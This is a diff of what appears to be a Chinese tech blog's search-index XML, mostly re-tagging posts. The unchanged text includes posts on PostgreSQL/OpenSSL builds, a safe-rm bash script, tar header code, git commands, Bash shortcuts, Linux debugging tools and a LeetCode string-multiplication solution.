@@ -16,10 +16,9 @@
     <url>%2F2019%2F12%2F28%2FPostgreSQL%2F2019-12-26-Postgresql-%E7%BC%96%E8%AF%91-with-openssl%2F</url>
     <content type="text"><![CDATA[关于Postgresql 添加编译选项–with-openssl 编译报错. 等一些列问题.是因为openssl 版本不正常。 其中增删了某些接口函数.本身使用OpenSSL 1.0.1e 11 Feb 2013 编译报错. 关于postgresql针对openssl的需求. 可在Postgresql源码中找到部分描述configure 后升级openssl 版本为 1OpenSSL 1.0.2k 26 Jan 2017 编译正常.openssh 下载地址为 https://ftp.openssl.org/source其中openssl-1.0.2k 下载地址为 https://ftp.openssl.org/source/old/1.0.2/openssl-1.0.2k.tar.gz err 1:编译过程如报错: 1234567cms.pod around line 457: Expected text after =item, not a numbercms.pod around line 461: Expected text after =item, not a numbercms.pod around line 465: Expected text after =item, not a numbercms.pod around line 470: Expected text after =item, not a numbercms.pod around line 474: Expected text after =item, not a numberPOD document had syntax errors at /usr/bin/pod2man line 69.make: *** [install_docs] Error 1 解决办法： 1rm -f /usr/bin/pod2man err 2:openssl:报错: 1openssl: error while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory 解决办法: 12ln -s /usr/local/lib64/libssl.so.1.1 /usr/lib64/libssl.so.1.1ln -s /usr/local/lib64/libcrypto.so.1.1 /usr/lib64/libcrypto.so.1.1]]></content>
       <categories>
-        <category>数据库</category>
+        <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
       </tags>
   </entry>
@@ -31,7 +30,6 @@
         <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
       </tags>
   </entry>
@@ -43,7 +41,6 @@
         <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
       </tags>
   </entry>
@@ -63,7 +60,7 @@
     <url>%2F2019%2F09%2F11%2Fcode%2Fsafe-rm%2F</url>
     <content type="text"><![CDATA[声明alias rm=&#39;safe-rm.sh&#39; 主要用于放置rm误删除操作. 建立隐藏文件夹[按日期建立]用于保存删除文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#!/bin/bash# 安全的rm脚本dir=$(date "+%y_%m_%d")#dir="/Users/rocky/.usertrash/$dir"dir="/Users/rocky/.Trash/$dir"#echo $dirif [ ! -d $dir ];then mkdir -p $dirfiis_f=falseargs=""function f_remove() &#123; for i in $&#123;args&#125;; do if [ -d "$i" -o -f "$i" ];then name=`basename $i` if [ -d "$dir/$name" -o -f "$dir/$name" ];then new_name="$dir/$&#123;name&#125;_$(date '+%T')" mv $i $new_name &amp;&amp; echo "$i deleted,you can see in $new_name" else mv $i $dir &amp;&amp; echo "$i deleted,you can see in $dir/$i" fi else echo "参数错误" fi done&#125;function remove() &#123; for j in $&#123;args&#125;; do if [ -d "$j" -o -f "$j" ];then name=`basename $j` #read -p "Remove $name?[y/n]" bool ## 是否开启删除提醒功能;l #if [ $bool == "n" ];then # exit #elif [ $bool == "y" ];then if [ -d "$dir/$name" -o -f "$dir/$name" ];then new_name="$dir/$&#123;name&#125;_$(date '+%T')" mv $j $new_name &amp;&amp; echo "$j deleted,you can see in $new_name" else mv $j $dir &amp;&amp; echo "$j deleted,you can see in $dir/$j" fi #fi else echo "参数错误" fi done&#125;while [ "$1" ]; do case "$1" in -fr|-rf) is_f=true shift ;; -i) is_f=false shift ;; *) args="$1 $args" shift ;; esacdoneif [[ $is_f = true ]];then f_removeelse removefi]]></content>
       <categories>
-        <category>命令篇</category>
+        <category>命令</category>
       </categories>
       <tags>
         <tag>Linux</tag>
@@ -87,7 +84,7 @@
     <url>%2F2019%2F08%2F28%2FPostgreSQL%2F2019-09-01-Linux-tar-%E5%8D%8F%E8%AE%AE%E6%A0%BC%E5%BC%8F-%E8%A7%A3%E6%9E%90%2F</url>
     <content type="text"><![CDATA[Tar仅仅是归档文件, 用于多个文件合并. 并不进行压缩; 介绍Tar结构体 以及如何归档 Tar归档文件组成归档单个文件tar -cf off.tar offpage.c Tar = 512Byte + file.st_size + padding; 归档多个文件Tar = 512Byte + file.st_size + padding * N [0-N]; 归档文件夹tar -cf dir.tar dir/ 归档文件夹: 512Byte(文件夹信息) + 文件归档 * N; Tar头部结构:1234567891011121314151617181920struct tar_header&#123; char name[100]; char mode[8]; char uid[8]; char gid[8]; char size[12]; char mtime[12]; //148byte char chksum[8]; char typeflag; //156byte char linkname[100]; char magic[6]; char version[2]; char uname[32]; char gname[32]; char devmajor[8]; char devminor[8]; char prefix[155]; char padding[12];&#125;; man tar.h可以查看更多信息; tarCreateHeader12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485inttarCheckSum(char *header)&#123; int i, sum; sum = 8 * ' '; for (i = 0 ; i &lt; TAR_HEADER_LENGTH ; i++ ) if (i &lt; 148 || i &gt;= 156) sum += 0xFF &amp; header[i]; return sum;&#125;enum tarErrortarCreateHeader(char *header, const char *filename, const char *linktarget, struct stat *filebuf)&#123; struct passwd *userinfo = NULL; struct group *groupinfo = NULL; if (strlen(filename) &gt; 99) return TAR_NAME_TOO_LONG; if (linktarget &amp;&amp; strlen(linktarget) &gt; 99) return TAR_SYMLINK_TOO_LONG; memset(header, 0, TAR_HEADER_LENGTH); strncpy(&amp;header[0], filename, 100); //filename[100] if (linktarget != NULL || S_ISDIR(filebuf-&gt;st_mode)) &#123; int flen = strlen(filename); flen = flen &gt; 99 ? 99 : flen; header[flen] = '/'; header[flen + 1] = '\0'; &#125; write_tar_number(&amp;header[100], 8, ( filebuf-&gt;st_mode &amp; 07777)); write_tar_number(&amp;header[108], 8, filebuf-&gt;st_uid); write_tar_number(&amp;header[116], 8, filebuf-&gt;st_gid); if (linktarget != NULL || S_ISDIR(filebuf-&gt;st_mode)) write_tar_number(&amp;header[124], 12, 0); else write_tar_number(&amp;header[124], 12, filebuf-&gt;st_size); //size = file size; write_tar_number(&amp;header[136], 12, filebuf-&gt;st_mtime); //modify time; // 156byte is typeflag; if (linktarget != NULL) &#123; header[156] = '2'; strncpy(&amp;header[157], linktarget, 100); &#125; else if (S_ISDIR(filebuf-&gt;st_mode)) header[156] = '5'; //else if (S_ISBLK(filebuf-&gt;st_mode)) // header[156] = '4'; //else if (S_ISCHR(filebuf-&gt;st_mode)) // header[156] = '3'; //else if(S_ISFIFO(filebuf-&gt;st_mode)) // header[156] = '6'; else header[156] = '0'; strcpy(&amp;header[257], "ustar"); //magic memcpy(&amp;header[263], "00", 2); //version; userinfo = getpwuid(filebuf-&gt;st_uid); groupinfo = getgrgid(filebuf-&gt;st_gid); strncpy(&amp;header[265], userinfo-&gt;pw_name, 32); //u name; strncpy(&amp;header[297], groupinfo-&gt;gr_name, 32); //g name; write_tar_number(&amp;header[329], 8, 0); //major; write_tar_number(&amp;header[337], 8, 0); //minor; write_tar_number(&amp;header[148], 8, tarCheckSum(header)); //checksum;; return TAR_OK; 填充文件数据123456789101112131415161718192021222324252627282930313233343536373839404142void writeTarData(FILE *tarfile, char *buf, int r, char *current_file)&#123; if (fwrite(buf, r, 1, tarfile) != 1) &#123; fprintf(stderr, ("%s: could not write to file \"%s\": %s\n"), "cs51-tar", current_file, strerror(errno)); exit(1); &#125;&#125;#define WRITE_TAR_DATA(buf, sz) writeTarData(tarfile, buf, sz, filename)main:: for (int i = 0; i &lt; file num; i++) &#123; fp = fopen(file[i], "r");// printf("append %s\n", file[i]); memset(zerobuf, 0, sizeof(zerobuf)); stat(file[i], &amp;filebuf); header = (char *)malloc(sizeof(char) * TAR_HEADER_LENGTH); memset(header, 0, TAR_HEADER_LENGTH); //context file ; context = (char *)malloc(sizeof(char) * filebuf.st_size); fread(context, 1, filebuf.st_size, fp); tarCreateHeader(header, file[i], NULL, &amp;filebuf); padding = ((filebuf.st_size + 511) &amp; ~511) - filebuf.st_size; WRITE_TAR_DATA(header, TAR_HEADER_LENGTH); WRITE_TAR_DATA(context /*file data*/, filebuf.st_size); if (padding) WRITE_TAR_DATA(zerobuf, padding); &#125; WRITE_TAR_DATA(zerobuf, sizeof(zerobuf));]]></content>
       <categories>
-        <category>工具篇</category>
+        <category>工具</category>
       </categories>
       <tags>
         <tag>C/C++</tag>
@@ -102,7 +99,6 @@
         <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
       </tags>
   </entry>
@@ -111,7 +107,7 @@
     <url>%2F2019%2F08%2F25%2Fsoftware%2Fgit-command%2F</url>
     <content type="text"><![CDATA[git 常用命令: git stat git command git whatchanged git show git checkout git reset git commit git diff/apply git clean git branch git log git cherry-pick git rebase git merge 查看改动文件 git status 未add1234567891011[ligang@yfslcentos71 hgdb-9-15]$ git status # On branch ora-fun# Changes not staged for commit:# (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)# (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)## modified: src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c#no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)[ligang@yfslcentos71 hgdb-9-15]$ git add src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c[ligang@yfslcentos71 hgdb-9-15]$ git commit -m &quot;删除文件注释&quot; 修改最后一次提交作者信息修改最后一次提交1git commit --amend --author="ligang &lt;ligang@highgo.com&gt;" 连续几次1git rebase -i HEAD~3 将pick修改为edit12345Stopped at 230fe3404df2790712209e8797923d6af47a42c7... add contentYou can amend the commit now, with git commit --amendOnce you are satisfied with your changes, run git rebase --continue 此时，用户首先要使用git commit –amend -author修改该提交的作者信息，接着执行git rebase –continue继续修改下一个提交：12$ git commit --amend --author="Dennis &lt;dennis@top500corp.com&gt;" --no-edit$ git rebase --continue 依次修改即可 git whatchanged –stat 每次修改的文件列表, 及文件修改的统计 已经add12345678910111213141516171819[ligang@yfslcentos71 hgdb-9-15]$ git whatchanged --stat commit 5afb2d3426637fedb1fe6b5fa525091028005eedAuthor: ligang &lt;ligang@highgo.com&gt;Date: Sun Sep 16 13:35:33 2018 +0800 删除文件注释 src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c | 2 -- 1 file changed, 2 deletions(-)commit 593a62120591211eeaf598e059ec67f9c079dd39Author: ligang &lt;ligang@highgo.com&gt;Date: Sun Sep 16 13:25:02 2018 +0800 修改完成 src/backend/parser/parse_node.c | 26 ++++++++++++++++++++++---- src/bin/initdb/initdb.c | 2 ++ 2 files changed, 24 insertions(+), 4 deletions(-) 查看Commit改动 git show123456789101112131415161718192021222324[ligang@yfslcentos71 hgdb-9-15]$ git show src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.ccommit 5afb2d3426637fedb1fe6b5fa525091028005eedAuthor: ligang &lt;ligang@highgo.com&gt;Date: Sun Sep 16 13:35:33 2018 +0800 删除文件注释diff --git a/src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c b/src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.cindex ae6f262..ee61b5d 100644--- a/src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c+++ b/src/backend/utils/adt/oracle_compatibility/hgdbfuncs_oracle.c@@ -1170,12 +1170,10 @@ Datum orafnp_decode(PG_FUNCTION_ARGS) if (!OidIsValid(resulttype)) elog(ERROR, &quot;could not determine data type of decode() input&quot;); - //ligang_change_begin if( 4 == nargs &amp;&amp; UNKNOWNOID == searchtype) &#123; searchtype = TEXTOID; &#125;- //ligang_change_end if (nargs % 2 == 0) &#123; 放弃本地所有修改 git checkout . 未使用 git add1git checkout -- filename ## -- 指定当前版本, 可以指定commit id; 放弃已经缓存的修改 git reset 使用 git add .12可以使用 git reset HEAD filepathname （比如： git reset HEAD readme.md）来放弃指定文件的缓存，放弃所有的缓存可以使用 git reset HEAD . 撤销提交的Commit1git reset --options HEAD~n –mixed 不删除工作空间改动代码，撤销commit，并且撤销git add . –soft 不删除工作空间改动代码，撤销commit，不撤销git add . –hard 删除工作空间改动代码，撤销commit，撤销git add . 推回 commit 状态 已经使用add .12git reset --hard HEADgit reset --hard commitid 将commit id 作为分支:1git checkout -b ligang-read commit`id 文件diff12345git diff ## 可以对比分支;git diff brach-name &gt; ../change.diff git apply --check ../change.diff ## 检查diff是否可用 对比不同commit的文件1git diff hash1 hash2 filename 清除未识别 - 恢复原始12git checkout .git clean -d -fx 重命名分支:1git branch -m oldName newName 删除远程分支1git push --delete origin oldName 把修改后的本地分支 与 远程分支关联1git branch --set-upstream-to origin/newName 查看文件所有提交历史 git log -p1git log -p fileName 追踪函数在git历史中的变化;1git log -L :checksum_bctlist:src/backend/postmaster/bct.c 合并commit id:1git rebase -i &lt;startpointer&gt; &lt;endpointer&gt; 1git rebase -i HEAD~n ##n 代表要合并的commit数目; 可以只写startpointer ; 在编辑合并界面， 进行pick sque 操作; 合并某个分支上的单个commitdd2e86 - 946992 -9143a9 - a6fd86 - 5a6057 [master] ​ \ ​ 76cada - 62ecb3 - b886a0 [feature] feature 分支上的commit 62ecb3 非常重要，它含有一个bug的修改，或其他人想访问的内容。无论什么原因，你现在只需要将62ecb3 合并到master，而不合并feature上的其他commits，所以我们用git cherry-pick命令来做： 123git checkout mastergit cherry-pick 62ecb3 现在62ecb3 就被合并到master分支，并在master中添加了commit（作为一个新的commit）. 合并某个分支的一系列commit;合并单个commit可能并不满足, 需要合并一些列相连的commits; 这种情况需要使用rebase. dd2e86 - 946992 -9143a9 - a6fd86 - 5a6057 [master] ​ \ ​ 76cada - 62ecb3 - b886a0 [feature] 首先需要基于feature创建一个新的分支，并指明新分支的最后一个commit： 1git checkout -b newbranch 62ecb3 然后，rebase将这个新的分支commit合并到master( –onto masdter). 76cada^ 指明你想从哪个特定的commit开始。 1git rebase --onto master 76cada^ 得到结果, 就是feature分支的commit 76cada ~62ecb3 都被合并到了master分支。 Merge 合并分支git merge命令用于合并指定分支到当前分支。 合并后，在查看readme.txt的内容;]]></content>
       <categories>
-        <category>工具篇</category>
+        <category>工具</category>
       </categories>
       <tags>
         <tag>Linux</tag>
@@ -126,7 +122,6 @@
         <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
       </tags>
   </entry>
@@ -138,7 +133,6 @@
         <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
       </tags>
   </entry>
@@ -150,7 +144,6 @@
         <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
       </tags>
   </entry>
@@ -171,7 +164,7 @@
     <url>%2F2018%2F12%2F05%2Fsoftware%2FBash%E5%BF%AB%E6%8D%B7%E9%94%AE%2F</url>
     <content type="text"><![CDATA[编辑命令 Ctrl + a ：移到命令行首 Ctrl + e ：移到命令行尾 Ctrl + f ：按字符前移（右向） Ctrl + b ：按字符后移（左向） Alt + f ：按单词前移（右向） Alt + b ：按单词后移（左向） Ctrl + xx：在命令行首和光标之间移动 Ctrl + u ：从光标处删除至命令行首 Ctrl + k ：从光标处删除至命令行尾 Ctrl + w ：从光标处删除至字首 Alt + d ：从光标处删除至字尾 Ctrl + d ：删除光标处的字符 Ctrl + h ：删除光标前的字符 Ctrl + y ：粘贴至光标后 Alt + c ：从光标处更改为首字母大写的单词 Alt + u ：从光标处更改为全部大写的单词 Alt + l ：从光标处更改为全部小写的单词 Ctrl + t ：交换光标处和之前的字符 Alt + t ：交换光标处和之前的单词 Alt + Backspace：与 Ctrl + w 相同类似，分隔符有些差别 重新执行命令 Ctrl + r：逆向搜索命令历史 Ctrl + g：从历史搜索模式退出 Ctrl + p：历史中的上一条命令 Ctrl + n：历史中的下一条命令 Alt + .：使用上一条命令的最后一个参数 控制命令 Ctrl + l：清屏 Ctrl + o：执行当前命令，并选择上一条命令 Ctrl + s：阻止屏幕输出 Ctrl + q：允许屏幕输出 Ctrl + c：终止命令 Ctrl + z：挂起命令 Bang (!) 命令 !!：执行上一条命令 !blah：执行最近的以 blah 开头的命令，如 !ls !blah:p：仅打印输出，而不执行 !$：上一条命令的最后一个参数，与 Alt + . 相同 !$:p：打印输出 !$ 的内容 !*：上一条命令的所有参数 !:p：打印输出 ! 的内容 ^blah：删除上一条命令中的 blah ^blah^foo：将上一条命令中的 blah 替换为 foo ^blah^foo^：将上一条命令中所有的 blah 都替换为 foo 友情提示： 以上介绍的大多数 Bash 快捷键仅当在 emacs 编辑模式时有效，若你将 Bash 配置为 vi 编辑模式，那将遵循 vi 的按键绑定。Bash 默认为 emacs 编辑模式。如果你的 Bash 不在 emacs 编辑模式，可通过 set -o emacs 设置。 ^S、^Q、^C、^Z 是由终端设备处理的，可用 stty 命令设置。]]></content>
       <categories>
-        <category>Bash</category>
+        <category>命令</category>
       </categories>
       <tags>
         <tag>Linux</tag>
@@ -183,12 +176,12 @@
     <url>%2F2018%2F12%2F04%2Fsoftware%2FCentOS-%E5%AE%89%E8%A3%85TheFuck%2F</url>
     <content type="text"><![CDATA[任务: 安装TheFuck 替换yum python 环境: CentOS Linux release 7.6.1810 (Core) Python 版本2.7.5 发现TheFuck需要Python至少 3.4+ 首先 升级Python版本。以前安装过python3.6, 但是需要将其默认Python 软连接到 Python3.6 123456[Postgres@Postgres]python -VPython 2.7.5[Postgres@Postgres]sudo mv /usr/bin/python /usr/bin/python2.7.5[Postgres@Postgres]sudo ln -s /usr/local/python3/bin/python3 /usr/bin/python[Postgres@Postgres]python -VPython 3.6.4 Python版本已经替换 当我们替换默认Python版本后，发现yum并不能使用 修改: /usr/bin/yum 1#!/usr/bin/python 修改为: 1#!/usr/bin/python2.7.5 对应自己版本号即可。 如果yum命令使用过程中，还发现存在问题，请直接按照上边进行修改即可 更新python pip123 sudo yum -y install epel-release sudo yum install python-pip sudo pip install --upgrade pip 替换后报错 1Command "python setup.py egg_info" failed with error code 1 in /tmp/pip-install-Nd5ZPx/pyte/ 解决办法: 12sudo pip install --upgrade setuptools sudo yum install python-devel 安装Thefuck1sudo pip install thefuck bash配置: 1alias fuck=&apos;eval $(thefuck $(fc -ln -1)); history -r&apos; 可直接加入.bashrc配置文件中. TheFuck 版本升级: 1sudo pip install thefuck --upgrade]]></content>
       <categories>
-        <category>工具篇</category>
+        <category>工具</category>
       </categories>
       <tags>
         <tag>Commands</tag>
-        <tag>Python</tag>
         <tag>Software</tag>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -209,26 +202,33 @@
     <title><![CDATA[Linux-调试]]></title>
     <url>%2F2018%2F11%2F06%2Frebuild%2FLinux-%E8%B0%83%E8%AF%95%2F</url>
     <content type="text"><![CDATA[前言Linux常用命令中有一些命令可以在开发或调试过程中起到很好的帮助作用，有些可以帮助了解或优化我们的程序，有些可以帮我们定位疑难问题。本文将简单介绍一下这些命令。 示例程序我们用一个小程序，来帮助后面我们对这些命令的描述，程序清单cmdTest.c如下: 12345678910111213#include&lt;stdio.h&gt;int test(int a,int b)&#123; return a/b;&#125;int main(int argc,char *argv[])&#123; int a = 10; int b = 0; printf("a=%d,b=%d\n",a,b); test(a,b); return 0;&#125; 编译获得elf文件cmdTest并运行： 1234gcc -g -o cmdTest cmdTest.c./cmdTesta=10,b=0Floating point exception (core dumped) 程序内容是在main函数中调用test，计算a/b的值，其中b的值为0，因此程序由于除0错误异常终止。 查看文件基本信息–file12file cmdTestcmdTest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=448e1c34b4c548120e2c04f6a2bfce4e6d2281a3, not stripped 通过file命令可以看到cmdTest的类型为elf，是64位、运行于x86-64的程序，not striped表明elf文件中还保留着符号信息以及调试信息等不影响程序运行的内容。 查看程序依赖库–ldd1234ldd cmdTest linux-vdso.so.1 =&gt; (0x00007ffc8e548000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0621931000) /lib64/ld-linux-x86-64.so.2 (0x00007f0621cf6000) 我们可以看到cmdTest依赖了libc.so等库。 查看函数或者全局变量是否存在于elf文件中–nmnm命令用于查看elf文件的符号信息。文件编译出来之后，我们可能不知道新增加的函数或者全局变量是否已经成功编译进去。这时候，我们可以使用nm命令来查看。例如，查看前面所提到的elf文件有没有test函数，可以用命令： 12nm cmdTest|grep test000000000040052d T test #打印结果 按照地址顺序列出符号信息： 123456789101112131415161718nm -n cmdTest w _ITM_deregisterTMCloneTable w _ITM_registerTMCloneTable w _Jv_RegisterClasses w __gmon_start__ U __libc_start_main@@GLIBC_2.2.5 U printf@@GLIBC_2.2.500000000004003e0 T _init0000000000400440 T _start0000000000400470 t deregister_tm_clones00000000004004a0 t register_tm_clones00000000004004e0 t __do_global_dtors_aux0000000000400500 t frame_dummy000000000040052d T test0000000000400540 T main0000000000400590 T __libc_csu_init0000000000400600 T __libc_csu_fini(列出部分内容) 可以看到test函数的开始地址为0x000000000040052d，结束地址为0x0000000000400540。 打印elf文件中的可打印字符串–strings例如你在代码中存储了一个版本号信息，那么即使编译成elf文件后，仍然可以通过strings搜索其中的字符串甚至可以搜索某个.c文件是否编译在其中： 1strings elfFile | grep "someString" 查看文件段大小–size可以通过size命令查看各段大小： 123size cmdTest text data bss dec hex filename 1319 560 8 1887 75f cmdTest text段：正文段字节数大小data段:包含静态变量和已经初始化的全局变量的数据段字节数大小bss段：存放程序中未初始化的全局变量的字节数大小当我们知道各个段的大小之后，如果有减小程序大小的需求，就可以有针对性的对elf文件进行优化处理。 为elf文件”瘦身“–stripstrip用于去掉elf文件中所有的符号信息： 12345ls -al cmdTest-rwxr-xr-x 1 hyb root 9792 Sep 25 20:30 cmdTest #总大小为9792字节strip cmdTestls -al cmdTest-rwxr-xr-x 1 hyb root 6248 Sep 25 20:35 cmdTest#strip之后大小为6248字节 可以看到，“瘦身”之后，大小减少将近三分之一。但是要特别注意的是，“瘦身”之后的elf文件由于没有了符号信息，许多调试命令将无法正常使用，出现core dump时，问题也较难定位，因此只建议在正式发布时对其进行“瘦身”。 查看elf文件信息–readelfreadelf用于查看elf文件信息，它可以查看各段信息，符号信息等，下面的例子是查看elf文件头信息： 1234567891011121314151617181920readelf -h cmdTest Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 #elf文件魔数字 Class: ELF64 #64位 elf文件 Data: 2's complement, little endian#字节序为小端序 Version: 1 (current) OS/ABI: UNIX - System V # ABI Version: 0 Type: EXEC (Executable file)#目标文件类型 Machine: Advanced Micro Devices X86-64 #目标处理器体系 Version: 0x1 Entry point address: 0x400440 #入口地址 Start of program headers: 64 (bytes into file) Start of section headers: 4456 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 9 Size of section headers: 64 (bytes) Number of section headers: 28 Section header string table index: 27 从elf头信息中，我们可以知道该elf是64位可执行文件，运行在x86-64中，且字节序为小端序。另外，我们还注意到它的入口地址是0x400440(_start)，而不是400540(main)。也就是说，我们的程序运行并非从main开始。 反汇编指定函数–objdumpobjdump用于展示elf文件信息，功能较多，在此不逐一介绍。有时候我们需要反汇编来定位一些问题，可以使用命令： 1objdump -d cmdTest #反汇编整个cmdTest程序 但是如果程序较大，那么反汇编时间将会变长，而且反汇编文件也会很大。如果我们已经知道了问题在某个函数，只想反汇编某一个函数，怎么处理呢？我们可以利用前面介绍的nm命令获取到函数test的地址，然后使用下面的方式反汇编： 1objdump -d cmdTest --start-address=0x40052d --stop-address=0x400540 ##反汇编指定地址区间 端口占用情况查看–netstat我们可能常常会遇到进程第一次启动后，再次启动会出现端口绑定失败的问题，我们可以通过netstat命令查看端口占用情况： 1netstat -anp|grep 端口号 进程状态查看–ps&amp;topps命令的用法可以参考ps命令常见实用用法。top命令实时显示当前进程状态，最活跃的进程显示在最顶部。 core dump文件生成配置–ulimit -c有时候我们的程序core dump了却没有生成core文件，很可能是我们设置的问题： 123ulimit -c #查看core文件配置，如果结果为0，程序core dump时将不会生成core文件ulimit -c unlimited #不限制core文件生成大小ulimit -c 10 #设置最大生成大小为10kb 调试神器–gdbgdb是一个强大的调试工具，但这里仅介绍两个简单使用示例。有时候程序可能已经正在运行，但是又不能终止它，这时候仍然可以使用gdb调试正在运行的进程： 1gdb processFile PID #processFile为进程文件，pid为进程id，可通过ps命令查找到 有时候程序可能core dump了，但是系统还留给了我们一个礼物–core文件。在core文件生成配置完成之后，运行cmdTest程序，产生core文件。我们可以用下面的方法通过core文件定位出错位置： 123456789gdb cmdTest core #processFile为进程文件，core为生成的core文件Core was generated by `./cmdTest'.Program terminated with signal SIGFPE, Arithmetic exception.#0 0x00000000004004fb in test (a=10, b=0) at cmdTest.c:44 return a/b;(gdb)bt#0 0x00000000004004fb in test (a=10, b=0) at cmdTest.c:4#1 0x000000000040052c in main (argc=1, argv=0x7ffca9536d38) at cmdTest.c:10(gdb) 输入bt后，就可以看到调用栈了,出错位置在test函数，cmdTest.c的第4行。 定位crash问题–addr2line有时候程序崩溃了但不幸没有生成core文件，是不是就完全没有办法了呢？还是cmdTest的例子。运行完cmdTest之后，我们通过dmesg命令可以获取到以下内容 1[27153070.538380] traps: cmdTest[2836] trap divide error ip:40053b sp:7ffc230d9280 error:0 in cmdTest[400000+1000] 该信息记录了cmdTest运行出错的基本原因（divide error）和出错位置（40053b）,我们使用addr2line命令获取出错具体行号： 12addr2line -e cmdTest 40053b/home/hyb/practice/cmdTest.c:4 可以看到addr2line命令将地址(40053b)翻译成了文件名(cmdTest.c)和行号(4)，确定了出错位置。 转载自其它文章.]]></content>
+      <categories>
+        <category>调试</category>
+      </categories>
       <tags>
         <tag>Linux</tag>
         <tag>Commands</tag>
-        <tag>调试</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[Multiply Strings]]></title>
     <url>%2F2018%2F10%2F31%2Falogr%2FMultiply-Strings%2F</url>
     <content type="text"><![CDATA[Given two numbers represented as strings, return multiplication of the numbers as a string. Note: The numbers can be arbitrarily large and are non-negative. Note: The length of both num1 and num2 is &lt; 110. Both num1 and num2 contain only digits 0-9. Both num1 and num2 do not contain any leading zero, except the number 0 itself. You must not use any built-in BigInteger library or convert the inputs to integer directly. 思路: （Ps: 手写稍微忍耐一些吧 ^_^） 我们发现: p[i+j] = a[i] * b[j] + 进位; 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960char* multiply(char* num1, char* num2) &#123; int sz1 = strlen(num1); int sz2 = strlen(num2); int i, j = 0; int k = 0; int high, low; char *p = malloc(sizeof(char) * (sz1 + sz2 + 1)); memset(p + sz1 + sz2, 0, 1); memset(p, '0', sz1 + sz2); for(i = 0; i &lt; sz1; i++) &#123; for(j =0; j &lt; sz2; j++) &#123; high = ( num1[i] - '0' ) * ( num2[j] - '0' ) / 10 + ( p[i+j] - '0'); low = ( num1[i] - '0' ) * ( num2[j] - '0' ) % 10 + ( p[i+j+1] - '0'); if(high &gt; 9) &#123; p[i+j] = high - 10 + '0'; for(k = i+j-1; ; k--) &#123; if( p[k] != '9' ) &#123; p[k] += 1; break; &#125; else p[k] = '0'; &#125; &#125; else p[i+j] = high + '0'; if(low &gt; 9) &#123; p[i+j+1] = low - 10 + '0'; for(k = i+j; ; k--) &#123; if( p[k] != '9' ) &#123; p[k] += 1; break; &#125; else p[k] = '0'; &#125; &#125; else p[i+j+1] = low + '0'; &#125; &#125; for(i =0 ; i &lt; (sz1 + sz2 - 1); i++, p++) if( *p != '0') return p; return p;&#125; LeetÇode-问题描述 运行1W次时间:12345char * str1 = "9999999999999999999999999999999999999999999999999999";char * str2 = "9999999999999999999999999999999999999999999999999999";int i = 0;for( i = 0 ; i &lt;10000 ; i++) multiply(str1, str2); 123real 0m0.455suser 0m0.451ssys 0m0.003s LeetCode 测试结果:]]></content>
+      <categories>
+        <category>LeetCode</category>
+      </categories>
       <tags>
         <tag>C/C++</tag>
         <tag>Algorithm</tag>
-        <tag>LeetCode</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[二进制文件分析]]></title>
     <url>%2F2018%2F10%2F28%2Frebuild%2F%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%2F</url>
     <content type="text"><![CDATA[nm objdump readelf ar 二进制文件符号清单.文件信息等; nmnm用来列出目标文件的符号清单。 -a或–debug-syms：显示所有的符号，包括debugger-only symbols。 -B：等同于–format=bsd，用来兼容MIPS的nm。 -C或–demangle：将低级符号名解析(demangle)成用户级名字。这样可以使得C++函数名具有可读性。 –no-demangle：默认的选项，不需要将低级符号名解析成用户级名。 -D或–dynamic：显示动态符号。该任选项仅对于动态目标(例如特定类型的共享库)有意义。 -f format：使用format格式输出。format可以选取bsd、sysv或posix，该选项在GNU的nm中有用。默认为bsd。 -g或–extern-only：仅显示外部符号。 -n、-v或–numeric-sort：按符号对应地址的顺序排序，而非按符号名的字符顺序。 -p或–no-sort：按目标文件中遇到的符号顺序显示，不排序。 -P或–portability：使用POSIX.2标准输出格式代替默认的输出格式。等同于使用任选项-f posix。 -s或–print-armap：当列出库中成员的符号时，包含索引。索引的内容包含：哪些模块包含哪些名字的映射。 -r或–reverse-sort：反转排序的顺序(例如，升序变为降序)。 –size-sort：按大小排列符号顺序。该大小是按照一个符号的值与它下一个符号的值进行计算的。 –target=bfdname：指定一个目标代码的格式，而非使用系统的默认格式。 -u或–undefined-only：仅显示没有定义的符号(那些外部符号)。 –defined-only:仅显示定义的符号。 -l或–line-numbers：对每个符号，使用调试信息来试图找到文件名和行号。 -V或–version：显示nm的版本号。 –help：显示nm的选项。 objdumpogjdump工具用来显示二进制文件的信息，就是以一种可阅读的格式让你更多地了解二进制文件可能带有的附加信息。 -f 显示文件头信息 